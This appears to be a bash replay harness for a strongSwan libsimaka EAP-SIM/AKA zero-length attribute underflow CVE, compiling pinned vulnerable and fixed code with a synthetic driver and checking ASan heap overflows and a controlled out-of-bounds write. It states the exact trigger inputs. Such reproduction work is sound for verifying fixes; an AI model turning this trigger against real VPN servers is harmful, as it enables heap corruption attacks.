#!/usr/bin/env bash
# Replay for strongSwan CVE-2026-35330 / libsimaka zero-length EAP-SIM/AKA
# attribute underflow. All pinned source bytes come from pins/. No daemon,
# socket, IKE handshake, RADIUS server or network is used: chunk_t, the linked
# list and the chosen byte source are synthetic collaborators. See PROVENANCE.md.
set -uo pipefail
cd "$(dirname "$0")" || exit 2

P=pins
B=build
O=out
rm -rf "$B" "$O"
mkdir -p "$B" "$O"

pass=0
fail=0
: > "$O/trace.txt"

trace() { printf '%s\n' "$*" >> "$O/trace.txt"; }
check() {
    local name="$1" ok="$2"
    if [ "$ok" = 1 ]; then
        pass=$((pass + 1)); trace "PASS $name"
    else
        fail=$((fail + 1)); trace "FAIL $name"
    fi
}
has() { grep -qF -- "$2" "$1" && echo 1 || echo 0; }
no() { grep -qF -- "$2" "$1" && echo 0 || echo 1; }
srcline() { sed -n "${2}p" "$1"; }

# ---- 1. pin verification --------------------------------------------------
check "pin_vuln_source" "$( [ "$(sha256sum "$P/simaka_message.c.v6.0.5" | cut -d' ' -f1)" = 934cc1fd3c322da69f542b01e7fdf5314e6cd8db7b1aa6fd5ae17a774dbe97cb ] && echo 1 || echo 0)"
check "pin_fixed_source" "$( [ "$(sha256sum "$P/simaka_message.c.v6.0.6" | cut -d' ' -f1)" = ee91a54e7316afb4af18540f908bb4c8af04aeed795d76ee1809f136d7cc84b0 ] && echo 1 || echo 0)"
check "pin_fix_patch" "$( [ "$(sha256sum "$P/fix-aa5aaebc.patch" | cut -d' ' -f1)" = 7a67fda25fd9808ed06589ed2918145715b70e30ba804f337079357644aa37df ] && echo 1 || echo 0)"
check "pin_advisory" "$( [ "$(sha256sum "$P/advisory-CVE-2026-35330.html" | cut -d' ' -f1)" = 2673aa1c6197b9c92ad2eb0f095ec39e41b0d023f4d03a8a2cd4925cc77c6a73 ] && echo 1 || echo 0)"
check "pin_enum_header" "$( [ "$(sha256sum "$P/simaka_message.h.v6.0.5" | cut -d' ' -f1)" = c7d35ba1e53686ae3acea6eb6c007a05c97e839dafc1928b1077011c3766ca52 ] && echo 1 || echo 0)"

# ---- 2. asserted pinned source lines --------------------------------------
V=$P/simaka_message.c.v6.0.5
F=$P/simaka_message.c.v6.0.6
check "vuln_attr_malloc" "$( [ "$(srcline "$V" 257)" = '	attr = malloc(sizeof(attr_t) + data.len);' ] && echo 1 || echo 0)"
check "vuln_attr_memcpy" "$( [ "$(srcline "$V" 260)" = '	memcpy(attr->data, data.ptr, data.len);' ] && echo 1 || echo 0)"
check "vuln_rand_underflow" "$( [ "$(srcline "$V" 423)" = '				data = chunk_create(in.ptr + 4, hdr->length * 4 - 4);' ] && echo 1 || echo 0)"
check "vuln_default_underflow" "$( [ "$(srcline "$V" 446)" = '				data = chunk_create(in.ptr + 2, hdr->length * 4 - 2);' ] && echo 1 || echo 0)"
check "vuln_rand_missing_guard" "$( [ "$(srcline "$V" 419)" = '				if (hdr->length * 4 > in.len || in.len < 4)' ] && echo 1 || echo 0)"
check "vuln_default_missing_guard" "$( [ "$(srcline "$V" 442)" = '				if (hdr->length * 4 > in.len || in.len < 4)' ] && echo 1 || echo 0)"
check "fixed_rand_guard" "$( [ "$(srcline "$F" 419)" = '				if (hdr->length == 0 || hdr->length * 4 > in.len || in.len < 4)' ] && echo 1 || echo 0)"
check "fixed_default_guard" "$( [ "$(srcline "$F" 442)" = '				if (hdr->length == 0 || hdr->length * 4 > in.len || in.len < 4)' ] && echo 1 || echo 0)"
check "enum_rand_is_one" "$(has "$P/simaka_message.h.v6.0.5" 'AT_RAND = 1,')"
check "enum_encr_data_is_130" "$(has "$P/simaka_message.h.v6.0.5" 'AT_ENCR_DATA = 130,')"
check "attr_t_shape" "$(has "$V" '	size_t len;')"
check "advisory_underflow_claim" "$(has "$P/advisory-CVE-2026-35330.html" 'integer underflow')"
check "advisory_all_versions" "$(has "$P/advisory-CVE-2026-35330.html" 'All versions since 4.3.6 are affected.')"
check "patch_two_branches" "$(has "$P/fix-aa5aaebc.patch" 'hdr->length == 0 || hdr->length * 4 > in.len')"

# ---- 3. generate verbatim-pinned variants ---------------------------------
gen_ok=1
for name in vuln fix; do
    if [ "$name" = vuln ]; then src=$P/simaka_message.c.v6.0.5; else src=$P/simaka_message.c.v6.0.6; fi
    sed -n '252,263p' "$src" > "$B/$name.add.block"
    sed -n '415,450p' "$src" > "$B/$name.branch.block"
    sed -n '452,480p' "$src" > "$B/$name.sink.block"
    {
        printf '#line 252 "src/libsimaka/simaka_message.c"\n'
        cat "$B/$name.add.block"
    } > "$B/$name.add.insert"
    {
        printf '#line 415 "src/libsimaka/simaka_message.c"\n'
        cat "$B/$name.branch.block"
    } > "$B/$name.branch.insert"
    {
        printf '#line 452 "src/libsimaka/simaka_message.c"\n'
        cat "$B/$name.sink.block"
    } > "$B/$name.sink.insert"
    awk -v a="$B/$name.add.insert" -v b="$B/$name.branch.insert" -v c="$B/$name.sink.insert" '
        $0 == "// BEGIN PINNED ADD_ATTRIBUTE" { print; while ((getline l < a) > 0) print l; close(a); skip=1; next }
        $0 == "// BEGIN PINNED PARSE BRANCH" { print; while ((getline l < b) > 0) print l; close(b); skip=1; next }
        $0 == "// BEGIN PINNED SINK SELECT" { print; while ((getline l < c) > 0) print l; close(c); skip=1; next }
        $0 == "// END PINNED ADD_ATTRIBUTE" || $0 == "// END PINNED PARSE BRANCH" || $0 == "// END PINNED SINK SELECT" { skip=0 }
        !skip { print }
    ' driver.template.c > "$B/$name.c" || gen_ok=0
    gcc -std=gnu11 -O0 -g -fno-omit-frame-pointer -w -Wl,--wrap=malloc \
        "$B/$name.c" -o "$B/$name" || gen_ok=0
    gcc -std=gnu11 -O0 -g -fno-omit-frame-pointer -w -fsanitize=address \
        -Wl,--wrap=malloc "$B/$name.c" -o "$B/$name.asan" || gen_ok=0
    gcc -std=gnu11 -O0 -g -fno-omit-frame-pointer -w -DBOUNDED_COPY=131072 \
        -Wl,--wrap=malloc "$B/$name.c" -o "$B/$name.bounded" || gen_ok=0
done
check "generate_and_compile_two_pinned_variants" "$gen_ok"
# pinned bytes survive generation verbatim
check "generated_add_attribute_verbatim" "$(has "$B/vuln.c" 'attr = malloc(sizeof(attr_t) + data.len);')"
check "generated_underflows_verbatim" "$(has "$B/vuln.c" 'hdr->length * 4 - 2')"
check "generated_fixed_guard_verbatim" "$(has "$B/fix.c" 'hdr->length == 0 || hdr->length * 4 > in.len')"

# ---- 4. run cases ---------------------------------------------------------
# name|bin|type|hdr_len
cases=(
  'vuln_default_zero_plain|vuln|14|0'
  'vuln_default_benign_plain|vuln|14|1'
  'vuln_rand_zero_plain|vuln|1|0'
  'vuln_rand_benign_plain|vuln|1|1'
  'vuln_encr_zero_plain|vuln|130|0'
  'vuln_default_zero_asan|vuln.asan|14|0'
  'vuln_default_zero_bounded|vuln.bounded|14|0'
  'vuln_rand_zero_bounded|vuln.bounded|1|0'
  'vuln_default_benign_bounded|vuln.bounded|14|1'
  'vuln_rand_zero_asan|vuln.asan|1|0'
  'vuln_default_benign_asan|vuln.asan|14|1'
  'vuln_rand_benign_asan|vuln.asan|1|1'
  'fix_default_zero|fix|14|0'
  'fix_rand_zero|fix|1|0'
  'fix_default_benign|fix|14|1'
  'fix_rand_benign|fix|1|1'
  'fix_default_zero_asan|fix.asan|14|0'
  'fix_rand_zero_asan|fix.asan|1|0'
)
declare -A exit_of
for spec in "${cases[@]}"; do
    IFS='|' read -r name bin type hlen <<< "$spec"
    ASAN_OPTIONS=abort_on_error=0:detect_leaks=0:log_path=stderr \
        "$B/$bin" "$type" "$hlen" > "$O/$name.log" 2>&1
    rc=$?
    exit_of[$name]=$rc
    trace "CASE $name bin=$bin type=$type hdr_len=$hlen exit=$rc"
    grep -E '^(PARSE_RESULT|MALLOC_CALL|MEMCPY_CALL|COPY_LEN|NO_PROGRESS|REJECT|CHOSEN|GUARD_FAULT) ' "$O/$name.log" \
        | sed -E 's/0x[0-9a-fA-F]+/ADDR/g' >> "$O/trace.txt" || true
    if grep -q 'AddressSanitizer: heap-buffer-overflow' "$O/$name.log"; then
        wr=$(grep -m1 -o 'WRITE of size [0-9-]*' "$O/$name.log" | tr ' ' '=')
        fr=$(grep -m1 'simaka_message.c:258' "$O/$name.log" | tr -s ' ' | sed -E 's/0x[0-9a-fA-F]+/ADDR/g' | cut -c1-120)
        trace "ASAN case=$name $wr caller=${fr:-MISSING}"
    fi
done
check "r1_vuln_default_sink_length" "$(has "$O/vuln_default_zero_plain.log" 'MEMCPY_CALL requested=18446744073709551614')"
check "r1_vuln_rand_sink_length" "$(has "$O/vuln_rand_zero_plain.log" 'MEMCPY_CALL requested=18446744073709551612')"
check "r1_vuln_encr_no_progress" "$(has "$O/vuln_encr_zero_plain.log" 'NO_PROGRESS=1')"
check "r1_vuln_encr_no_add" "$(has "$O/vuln_encr_zero_plain.log" 'add_calls=0')"
check "r1_benign_default_advances" "$(has "$O/vuln_default_benign_plain.log" 'advanced=1')"
check "r1_benign_rand_advances" "$(has "$O/vuln_rand_benign_plain.log" 'advanced=1')"
# Rung 2 — allocation size wraps while copy length stays huge; fixed rejects.
check "r2_vuln_default_wrapped_alloc" "$(has "$O/vuln_default_zero_plain.log" 'MALLOC_CALL requested=14')"
check "r2_vuln_rand_wrapped_alloc" "$(has "$O/vuln_rand_zero_plain.log" 'MALLOC_CALL requested=12')"
check "r2_vuln_accepts" "$( [ "$(has "$O/vuln_default_zero_plain.log" 'MEMCPY_CALL')" = 1 ] && [ "$(no "$O/vuln_default_zero_plain.log" 'REJECT')" = 1 ] && echo 1 || echo 0)"
check "r2_fixed_default_rejects" "$(has "$O/fix_default_zero.log" 'REJECT reason=invalid_length type=14')"
check "r2_fixed_rand_rejects" "$(has "$O/fix_rand_zero.log" 'REJECT reason=invalid_length type=1')"
check "r2_fixed_no_sink" "$( [ "$(no "$O/fix_default_zero.log" 'MEMCPY_CALL')" = 1 ] && [ "$(no "$O/fix_rand_zero.log" 'MEMCPY_CALL')" = 1 ] && echo 1 || echo 0)"
check "r2_fixed_benign_still_adds" "$(has "$O/fix_default_benign.log" 'add_calls=1')"
# Rung 3 — ASan heap corruption at the pinned sink.
check "r3_default_asan_overflow" "$(has "$O/vuln_default_zero_asan.log" 'AddressSanitizer: heap-buffer-overflow')"
check "r3_default_asan_write" "$(has "$O/vuln_default_zero_asan.log" 'WRITE of size')"
check "r3_default_asan_pinned_caller" "$(has "$O/vuln_default_zero_asan.log" 'simaka_message.c:258')"
check "r3_default_asan_14_byte_region" "$(has "$O/vuln_default_zero_asan.log" '14-byte region')"
check "r3_rand_asan_overflow" "$(has "$O/vuln_rand_zero_asan.log" 'AddressSanitizer: heap-buffer-overflow')"
check "r3_rand_asan_pinned_caller" "$(has "$O/vuln_rand_zero_asan.log" 'simaka_message.c:258')"
check "r3_rand_asan_12_byte_region" "$(has "$O/vuln_rand_zero_asan.log" '12-byte region')"
check "r3_benign_asan_clean" "$( [ "$(no "$O/vuln_default_benign_asan.log" 'AddressSanitizer')" = 1 ] && [ "$(no "$O/vuln_rand_benign_asan.log" 'AddressSanitizer')" = 1 ] && echo 1 || echo 0)"
check "r3_fixed_asan_clean" "$( [ "$(no "$O/fix_default_zero_asan.log" 'AddressSanitizer')" = 1 ] && [ "$(no "$O/fix_rand_zero_asan.log" 'AddressSanitizer')" = 1 ] && echo 1 || echo 0)"
# Rung 4 INSTRUMENTED — bounded-copy collaborator shows chosen bytes at
# chosen offsets past the wrapped allocation; the real-libc case is preserved
# separately as the negative result.
check "r4_bounded_copy_label" "$(has "$O/vuln_default_zero_bounded.log" 'copied=131072')"
check "r4_default_chosen_match" "$(has "$O/vuln_default_zero_bounded.log" 'match=1')"
check "r4_default_chosen_offset16" "$(has "$O/vuln_default_zero_bounded.log" 'CHOSEN offset=16 got=5a exp=5a')"
check "r4_default_chosen_offset65536" "$(has "$O/vuln_default_zero_bounded.log" 'CHOSEN offset=65536 got=5a exp=5a')"
check "r4_rand_chosen_match" "$(has "$O/vuln_rand_zero_bounded.log" 'match=1')"
check "r4_real_libc_guard_fault" "$(has "$O/vuln_default_zero_plain.log" 'GUARD_FAULT')"
check "r4_real_libc_no_chosen_write" "$(has "$O/vuln_default_zero_plain.log" 'match=0')"
check "r4_benign_no_chosen_write" "$( [ "$(no "$O/vuln_default_benign_plain.log" 'CHOSEN ')" = 1 ] && echo 1 || echo 0)"
check "r4_fixed_no_chosen_write" "$( [ "$(no "$O/fix_default_zero.log" 'CHOSEN ')" = 1 ] && [ "$(no "$O/fix_rand_zero.log" 'CHOSEN ')" = 1 ] && echo 1 || echo 0)"

trace "SUMMARY PASS=$pass FAIL=$fail"
sha256sum "$O/trace.txt" | cut -d' ' -f1 > "$O/trace.sha256"
printf 'PASS=%d FAIL=%d\n' "$pass" "$fail"
printf 'trace=%s/trace.txt\n' "$O"
printf 'sha256=%s\n' "$(cat "$O/trace.sha256")"
[ "$fail" -eq 0 ]
